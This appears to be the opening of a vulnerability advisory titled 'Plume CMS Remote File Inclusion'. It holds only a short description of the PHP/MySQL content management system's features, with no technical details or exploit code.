Plume CMS Remote File Inclusion

It uses PHP and MySql. With a single installation of
Plume you can have
multiple websites, file management, multiple authors

Plume CMS proposes a flexible plugin infrastructure to
extend it and is fully accessible with output
providing standard compliant code by default.
